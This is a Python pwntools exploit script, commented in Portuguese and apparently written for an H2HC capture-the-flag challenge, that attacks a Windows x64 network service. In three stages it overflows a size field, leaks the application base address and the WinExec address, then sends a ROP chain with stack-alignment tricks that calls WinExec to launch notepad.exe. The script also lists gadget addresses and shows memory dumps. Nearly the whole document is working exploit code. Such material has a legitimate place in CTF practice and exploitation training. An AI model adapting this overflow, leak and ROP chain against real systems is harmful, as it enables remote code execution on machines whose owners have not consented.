#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
Aplicação H2HC criado para CTF
Exploit criado por M4v3r1ck (helvio_junior[at]hotmail[dot]com)
'''

from pwn import *
import os
 
context(arch='amd64', os='windows', log_level='debug')

host= "192.168.255.202"
port = 54345

# Estágio 1
log.info("Enviando estágio 1")
payload1  = "H2HC" #cookie 
payload1 += "\xff\x00\x00\x00" #size to trigger the vul
payload1 += "\x41" * 0xff
payload1 += "\n"

p = remote(host, port)
p.send(payload1)
p.recv(4096)
p.close()

# Estágio 2
log.info("Enviando estágio 2")
payload2  = "H2HC" 
payload2 += "\xff\x00\x00\x00" 
payload2 += "A" * 0x100
payload2 += "\x04\x09\x00\x00" 


p1 = remote(host, port)
p1.send(payload2)

p1.recvuntil("H2HC19 message:")


#Leak de um endereço no próprio fluxo de execução da aplicação (Sessão .text)
p1.recv(0x10d) 
ld1 = p1.recv(8)
leak_local_addr  = u64(ld1.ljust(8, "\x00"))

base_addr = leak_local_addr & 0xffffffffffff0000

log.info("Local leak   : %s" % hex(leak_local_addr))
log.info("App Base Addr   : %s" % hex(base_addr))

# Leak do endereço da função WinExec
p1.recv(0x7f0) #offset entre a posição zero até o 90 f0 7e 0a  fa 7f 
lead_data = p1.recv(8)
p1.recv(4096)

leak  = u64(lead_data.ljust(8, "\x00"))

log.info("WinExec addr leak   : %s" % hex(leak))
p1.close()


#Estágio 3 - Redirecting
payload3  = "H2HC" #cookie 
payload3 += "\x00\x01\x00\x00" #size to trigger the vul
payload3 += "\x10" * 256
payload3 += "\x01" #'e unsigned, este valor e multiplicado por 8 ent~ao tenho valor maximo de 2040
payload3 += "\x10" * (3)
payload3 += "\x41" * (8)


'''
0x000000014000464f : nop ; ret
0x00000001400016e0 : mov rcx, rdi ; call r14
0x00000001400086ba : pop r14 ; ret
0x0000000140001aa5 : pop rdi ; ret
0x00000001400086ba : pop r14 ; ret
0x00000001400016e0 : mov rcx, rdi ; call r14
0x00000001400046e2 : mov rax, rcx ; ret
0x00000001400021a9 : push rsp ; and al, 0x20 ; call rax
0x0000000140001aa5 : pop rdi ; ret
0x00000001400086ba : pop r14 ; ret
0x00000001400016e0 : mov rcx, rdi ; call r14
0x0000000140005bea : add edi, r15d ; ret
0x0000000140004b59 : pop r15 ; pop r13 ; pop r12 ; ret
0x0000000140005c0f : add ecx, edi ; ret
0x0000000140007cc8 : mov rax, r11 ; ret
0x0000000140005c14 : add eax, r15d ; ret
0x0000000140006e1d : mov rcx, rax ; call r12
0x0000000140005bfe : cld ; ret
0x000000014000464f : nop ; ret

0x0000000140001b4b : mov rdx, r13 ; add rax, r15 ; call rax
0x0000000140006e8c : mov rdx, r13 ; mov rcx, rbx ; call rax
0x0000000140006e1b : push rcx ; cmc ; mov rcx, rax ; call r12
0x0000000140008b4d : emms ; retf
0x0000000140005c16 : clc ; ret
0x0000000140005c0a : cli ; ret

#Instrução para ajustar a simetria para 16 byts
0x000000014000166a : add esp, 0x28 ; ret


Antes da adiçao de 0x28, podemos ver que a pilha não está alinhada a 16 bytes
>>> hex(0x000000000073FC98 & 0xFFFFFFFFFFFFFFF0)
'0x73fc90L'

Mas se inserir 0x28, a pinha fica alinhada
>>> inc=0x28
>>> hex(((0x000000000073FC98 + inc) & 0xFFFFFFFFFFFFFFF0))
'0x73fcc0L'
>>> hex(((0x000000000073FC98 + inc)))
'0x73fcc0'


Exemplo antes do add esp, 28
000000000073FC98  0000000000000000  
000000000073FCA0  0000000000000000  
000000000073FCA8  0000000000000000  
000000000073FCB0  0000000000000000  
000000000073FCB8  0000000000000000  
000000000073FCC0  00007FF7B7DA6E1D  h2hc.00007FF7B7DA6E1D
000000000073FCC8  0000000000000000  
000000000073FCD0  6F646E69575C3A63  
000000000073FCD8  65747379535C7377  
000000000073FCE0  65746F6E5C32336D  
000000000073FCE8  006578652E646170  
000000000073FCF0  0000000000000000  
000000000073FCF8  0000000000000000  
000000000073FD00  0000000000000000  
000000000073FD08  0000000000000000  
000000000073FD10  0000000000000000  
000000000073FD18  0000000000000000  
000000000073FD20  0000000000000000  


Após
000000000073FCC0  00007FF7B7DA6E1D  h2hc.00007FF7B7DA6E1D
000000000073FCC8  0000000000000000  
000000000073FCD0  6F646E69575C3A63  
000000000073FCD8  65747379535C7377  
000000000073FCE0  65746F6E5C32336D  
000000000073FCE8  006578652E646170  
000000000073FCF0  0000000000000000  
000000000073FCF8  0000000000000000  


Retorno do Winexec
ERROR_SUCCESS = 32
ERROR_NO_ASSOC = 31
ERROR_OUT_OF_MEM = 0
ERROR_FILE_NOT_FOUND = 2
ERROR_PATH_NOT_FOUND = 3
ERROR_BAD_FORMAT = 11
'''

payload3 += p64(base_addr + 0x0464f) # NOP RET para saltar para depois do alinhamento

payload3 += "\x41" * (4) # Alinhamento
payload3 += "\x42" * (8) # Trash


#ROP Chain
'''
Premissas para funcionar:
1 - O Comando tem de estar a frente da posição da pilha (ou 128 bytes antes) no momento do call da WinExec, 
    pois dentro da chamada da winexec ele utiliza alguns bytes anteriores a posição atual da stack, causando
    a substituição do nosso comando
2 - O Endereço do comando tem de estar alinhado a 16 bytes
    para saber se o endereço está alinhado basta realizar o calculo (endereço & 0xfffffffffffffff0)
3 - O Endereço da pilha no momento da chamada do call da WinExec tem de estar alinhado a 16 bytes
4 - Na Pilha tem de ter o equivalente a 3 parâmetros como Shadow data (3 * 8 bytes)
5 - Na quarta posição da pilha tem de haver um endereço válido da aplicação (não é efetivamente usado 
    mas dentro da WinExec ele cacula alguma coisa com este endereço e se for inválido da exception)
'''

base_offset = 928 # esse offset calcula de forma que o apontamento chegue a primeira instrução do ROP Chain abaixo

rop_chain2  = p64(leak) # WinExec --> Endereço que será chamado pelo call r12
rop_chain2 += p64(base_addr + 0x05c14) # add eax, r15d ; ret
rop_chain2 += p64(base_addr + 0x0166a) # add esp, 0x28 ; ret --> Ajusta o alinhamento a 16 bytes
rop_chain2 += "\x41" * 0x28
rop_chain2 += p64(base_addr + 0x0464f) # nop ; ret
rop_chain2 += p64(base_addr + 0x06e1d) # mov rcx, rax ; call r12
rop_chain2 += "\x00" * (8*3) # Shadow Data
rop_chain2 += p64(base_addr + 0x0464f) # NOP RET --> Será usado pela função WinExec
rop_chain2 += "\x00" * (8*10) # Padding
rop_chain2 += "\x00" * ((len(rop_chain2) + (8 * 4)) % 16) # Calcula simetria de 16 bytes


rop_chain1  = p64(base_addr + 0x07cc8) # mov rax, r11 ; ret
rop_chain1 += p64(base_addr + 0x04b59) # pop r15 ; pop r13 ; pop r12 ; ret
rop_chain1 += p64(base_offset + len(rop_chain2) + (8 * 4)) # Numero a ser adicionado em rax
rop_chain1 += "\x41" * 8

cmd = "notepad.exe"

payload3 += rop_chain1 + rop_chain2 + cmd + "\x00"

p2 = remote(host, port)
p2.send(payload3)

p2.interactive()

